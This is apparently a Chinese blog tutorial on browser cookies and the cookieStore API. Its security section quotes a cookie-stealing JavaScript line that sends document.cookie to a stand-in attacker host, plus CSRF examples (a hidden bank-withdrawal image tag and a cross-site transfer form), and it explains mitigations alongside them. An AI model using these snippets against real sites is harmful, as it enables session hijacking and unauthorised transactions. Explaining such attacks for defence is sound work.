---
date: 22:42 2023/3/22
title: cookieStore 的使用
tags:
- JS
description: document.cookie 接口是同步的、单线程的和阻塞的。cookieStore 是异步的，基于 promise 的，因此不会阻塞事件循环。
---
## 介绍
`Cookie` 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。也是一个 HTTP 请求标头，其中含有先前由服务器通过 `Set-Cookie` 响应标头发送或通过 JavaScript 的 `document.cookie` 方法设置，然后存储到本地的 Cookie。

`Set-Cookie` 是一个 HTTP 响应标头，被用来由服务器端向浏览器发送 cookie，浏览器可在后续的请求中将其发送回服务器。服务器要发送多个 cookie，则应该在同一响应中发送多个 Set-Cookie 标头。

可以通过在浏览器的隐私设置里面设置为禁用 cookie，来阻止接收发送和本地设置。

Cookie 主要用于以下三个方面：
- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

## 形式
一系列的名称/值对，形式为 `name=value; name2=value2; name3=value3`。名称/值对之间用分号和空格（'; '）隔开。

## Cookie 存储
Cookie 曾用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。

在浏览器中存储数据的新特性方法是 Web Storage API。`window.sessionStorage` 和`window.localStorage` 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie 大，并且永远不会发送到服务器。

可以使用 IndexedDB API 或基于它构建的库来存储更多结构化的数据。

## 安全
1. 如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。
```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
使用 HttpOnly 属性可防止通过 JavaScript 访问 cookie 值，从而在一定程度上缓解此类攻击。

2. 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短。
```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。一些方法可以阻止此类事件的发生：
- 对用户输入进行过滤来阻止 XSS；
- 任何敏感操作都需要确认；
- 用于敏感信息的 Cookie 只能拥有较短的生命周期；

3. `Set-Cookie` 响应标头 `SameSite` 属性设置为 `Strict` 或 `Lax`，确保不与跨域请求一起发送身份验证 cookie。例如，用户登陆了银行网站 `your-bank.com`，银行服务器发来了一个 Cookie：`Set-Cookie:id=a3fWa;`。用户后来又访问了恶意网站 `malicious.com`，上面有一个表单。
```html
<form action="your-bank.com/transfer" method="POST">
  ...
</form>
```
用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的转账请求。为了防止这种攻击，表单一般都带有一个随机 `token`，告诉服务器这是正确请求。
```html
<form action="your-bank.com/transfer" method="POST">
  <input type="hidden" name="token" value="dad3weg34">
  ...
</form>
```

## 第三方 Cookie
Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为第一方 cookie（ first-party cookie）。如果域不同，则它是第三方 cookie（third-party cookie）。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。比如，Facebook 在第三方网站插入一张看不见的图片。
```html
<img src="facebook.com" style="visibility:hidden;">
```
浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，如果你已经登录了 Facebook 帐号，Facebook 就会知道你访问了什么网站。

## 支持 unicode 的 cookie 工具
```js
var docCookies = {
  getItem: function (sKey) {
    return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
  },
  setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function (sKey, sPath, sDomain) {
    if (!sKey || !this.hasItem(sKey)) { return false; }
    document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + ( sDomain ? "; domain=" + sDomain : "") + ( sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function (sKey) {
    return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
  },
  keys: function () {
    var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nIdx = 0; nIdx < aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
    return aKeys;
  }
};

docCookies.setItem("test1", "Unicode test: \u00E0\u00E8\u00EC\u00F2\u00F9", Infinity);
docCookies.setItem("test2", "Hello world!", new Date(2020, 5, 12));
docCookies.setItem("test3", "Hello world!", new Date(2027, 2, 3), "/blog");
docCookies.setItem("test4", "Hello world!", "Sun, 06 Nov 2022 21:43:15 GMT");
docCookies.setItem("test5", "Hello world!", "Tue, 06 Dec 2022 13:11:07 GMT", "/home");
docCookies.setItem("test6", "Hello world!", 150);
docCookies.setItem("test7", "Hello world!", 245, "/content");
docCookies.setItem("test8", "Hello world!", null, null, "example.com");
docCookies.setItem("test9", "Hello world!", null, null, null, true);
docCookies.setItem("test1;=", "Safe character test;=", Infinity);

docCookies.getItem("test1;=");
docCookies.removeItem("test7", "/content");
```
路径限制并不能阻止从其他路径访问 cookie。使用简单的 DOM 即可轻易地绕过限制 (比如创建一个指向限制路径的，隐藏的 `iframe`, 然后访问其 `contentDocument.cookie` 属性)。保护 cookie 不被非法访问的唯一方法是将它放在另一个域名/子域名之下，利用同源策略保护其不被读取。

## cookieStore
chrome 87 开始可用，是一个在 Window 或 ServiceWorkerGlobalScope 上下文中的全局属性，用于管理 cookie。
1. `document.cookie` 接口是同步的、单线程的和阻塞的。`cookieStore` 是异步的，基于 promise 的，因此不会阻塞事件循环。
2. 因为在 service worker 无法访问 `document`，因此在 service worker 中也无法访问 `document.cookie`。而 `cookieStore` 不依赖于 `document`，所以在 service worker 中可用。

### 属性和方法
delete(name)  
delete(options)
- name
- 带有 cookie 名称的字符串。
- options
- 一个对象，包含：
    - name
    - 带有 cookie 名称的字符串。
    - url 可选的
    - 带有 cookie 的 URL 的字符串。
    - path 可选的
    - 包含路径的字符串。

删除成功返回一个 `undefined` 作为 `resolve` 的 `Promise`，失败则抛出 `TypeError`。

get(name)  
get(options)
- name
- 带有 cookie 名称的字符串。
- options
- 一个对象，包含：
    - name
    - 带有 cookie 名称的字符串。
    - url
    - 带有 cookie 的 URL 的字符串。

返回一个与名称或选项匹配的第一个 cookie 对象作为 `resolve` 的 `Promise`，该对象包含以下属性：
- name
- 包含 cookie 名称的字符串。
- value
- 包含 cookie 值的字符串。
- domain
- 包含 cookie 域的字符串。
- path
- 包含 cookie 路径的字符串。
- expires
- DOMTimeStamp，包含 cookie 的到期日期。
- secure
- boolean，指示 cookie 是否仅在安全上下文中使用。
- sameSite
- 以下值之一：
    - "strict"
    - Cookie 只会在第一方上下文中发送，不会随第三方网站发起的请求一起发送。
    - "lax"
    - Cookie 不会在正常的跨站点子请求中发送（例如，将图像或框架加载到第三方站点），而是在用户在源站点内导航时发送（即，当点击链接时）。
    - "none"
    - Cookie 将在所有情况下发送。

获取失败则抛出 `TypeError`。

getAll(name)  
getAll(options)
- name 可选的
- 带有 cookie 名称的字符串。
- options 可选的
- 一个对象包含：
    - name
    - 带有 cookie 名称的字符串。
    - url
    - 带有 cookie 的 URL 的字符串。
返回一个 cookie 对象数组作为 `resolve` 的 `Promise`，获取失败则抛出 `TypeError`。

set(name, value)  
set(options)
- name
- 带有 cookie 名称的字符串。
- value
- 带有 cookie 值的字符串。
- options
- 一个对象包含：
    - name
    - 带有 cookie 名称的字符串。
    - value
    - 带有 cookie 值的字符串。
    - expires 可选的
    - DOMTimeStamp包含 cookie 的到期日期。
    - domain 可选的
    - 包含 cookie 域的字符串。
    - path 可选的
    - 包含 cookie 路径的字符串。
    - sameSite 可选的
    - 以下值之一：
        - "strict"
        - Cookie 只会在第一方上下文中发送，不会与第三方网站发起的请求一起发送。
        - "lax"
        - Cookie 不会在正常的跨站点子请求中发送（例如将图像或框架加载到第三方站点），而是在用户导航到源站点时发送（即，当点击链接时）。
        - "none"
        - Cookie 将在所有情况下发送。

设置成功返回一个 `undefined` 作为 `resolve` 的 `Promise`，失败则抛出 `TypeError`。如果 origin 不能被序列化为 URL，则抛出 `SecurityError`。

change 事件属性  
当删除或添加 cookie 时，会触发 `change` 事件。

其他属性和方法继承自 `EventTarget`。

### 示例
```js
cookieStore.onchange = function(e) {
  const type = e.deleted.length > 0 ? '删除' : '添加';
  const item = e.deleted.length > 0 ? e.deleted[0] : e.changed[0];
  console.log(type, item);
}; // 在set之前

cookieStore.set('cookie1', 'cookie1-value').then(e => console.log('添加成功')).catch(console.log);

const day = 24 * 60 * 60 * 1000;
cookieStore.set({
  name: 'cookie2',
  value: 'cookie2-value',
  expires: Date.now() + day,
  domain: '127.0.0.1'
}).then(e => console.log('添加成功')).catch(console.log);

deleteBtn.onclick = () => cookieStore.delete('cookie1').then(e => console.log('删除成功')).catch(console.log);
```
